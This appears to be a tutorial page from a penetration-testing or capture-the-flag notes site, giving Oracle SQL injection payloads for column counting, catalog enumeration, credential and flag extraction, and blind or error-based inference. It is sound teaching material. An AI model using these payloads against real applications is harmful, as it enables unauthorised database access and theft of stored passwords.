---
title: "06 · SQLi — Oracle"
weight: 15
bookToc: true
---

# Oracle SQLi

**Flow:** Oracle error / function → UNION with `dual` → current-user tables → column types → data.

Start with the [general SQLi workflow](../sqli/). Oracle-specific syntax is useful only after matching the original quote/parenthesis context.

## 1. Fingerprint and count columns

Traditional Oracle SELECT probes use `dual`. This remains useful across versions even where newer releases permit some SELECTs without it.

```sql
missing' UNION SELECT NULL FROM dual-- -
missing' UNION SELECT NULL,NULL FROM dual-- -
missing' UNION SELECT NULL,NULL,NULL FROM dual-- -
```

Find a text-compatible reflected position, then:

```sql
missing' UNION SELECT NULL,USER,NULL FROM dual-- -
missing' UNION SELECT NULL,banner,NULL FROM v$version-- -
```

Access to `v$version` can vary. A permission error on that view does not disprove Oracle. Errors beginning `ORA-` are useful corroboration.

## 2. Enumerate accessible tables

Standalone queries:

```sql
SELECT table_name FROM user_tables ORDER BY table_name;
SELECT owner,table_name FROM all_tables ORDER BY owner,table_name;
```

Complete example:

```sql
missing' UNION SELECT NULL,table_name,NULL FROM user_tables-- -
```

`USER_TABLES` shows tables owned by the current user. `ALL_TABLES` shows accessible tables. Do not assume access to DBA catalog views.

## 3. Enumerate columns

Ordinary unquoted identifiers are stored uppercase:

```sql
SELECT column_name,data_type FROM user_tab_columns
WHERE table_name='USERS' ORDER BY column_id;

SELECT owner,column_name,data_type FROM all_tab_columns
WHERE owner='APP' AND table_name='USERS' ORDER BY column_id;
```

```sql
missing' UNION SELECT NULL,column_name||':'||data_type,NULL FROM user_tab_columns WHERE table_name='USERS'-- -
```

Quoted identifiers keep their declared case. If the catalog says `SecretFlags`, quote it exactly: `"SecretFlags"`.

## 4. Read data

```sql
SELECT USERNAME,PASSWORD FROM USERS;
SELECT FLAG FROM FLAGS;
SELECT TO_CHAR(ID)||':'||USERNAME||':'||NVL(PASSWORD,'<NULL>') FROM USERS;
```

```sql
missing' UNION SELECT NULL,USERNAME||':'||PASSWORD,NULL FROM USERS-- -
```

Oracle uses `||` for concatenation and `TO_CHAR()` for explicit conversion. Empty strings are treated as NULL in ordinary character data, which can affect conditions and markers.

One row at a time on Oracle 12c+:

```sql
SELECT FLAG FROM FLAGS ORDER BY ID OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;
```

Older version:

```sql
SELECT FLAG FROM (SELECT FLAG FROM FLAGS ORDER BY ID) WHERE ROWNUM=1;
```

Aggregate shorter text where supported and within output size limits:

```sql
SELECT LISTAGG(TABLE_NAME,',') WITHIN GROUP (ORDER BY TABLE_NAME) FROM USER_TABLES;
```

`LISTAGG` can overflow; individual rows avoid that. CLOBs may need `DBMS_LOB.SUBSTR(FLAG,2000,1)` before rendering in a text column; privileges and UNION compatibility still apply.

## 5. Blind predicates

```sql
LENGTH(USER)>5
ASCII(SUBSTR(USER,1,1))>109
EXISTS(SELECT 1 FROM USER_TABLES WHERE TABLE_NAME='FLAGS')
ASCII(SUBSTR((SELECT FLAG FROM FLAGS WHERE ROWNUM=1),1,1))>109
```

To read a stable row, prefer an exact unique key. `ROWNUM=1` without ordered nesting may select an unpredictable row.

## 6. Conditional error

An expression like this may provide an error oracle if the server exposes different responses:

```sql
1 AND (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'ok' END FROM dual)='ok'
1 AND (SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE 'ok' END FROM dual)='ok'
```

Keep CASE branch types compatible. Oracle's behavior here differs from SQLite's NULL result for division by zero. Test both controls repeatedly before extracting data.

## Time and stacked queries

Do not paste MySQL `SLEEP` or SQL Server `WAITFOR` into an Oracle expression. Delay packages have execution grants and invocation-context requirements. Many Oracle application APIs execute one statement and do not accept an arbitrary stacked batch. Use the boolean/error oracle already established instead of assuming package access.

Official references: [ALL_TAB_COLUMNS](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html), [USER_TABLES](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/USER_TABLES.html), [SQL Language Reference](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/).
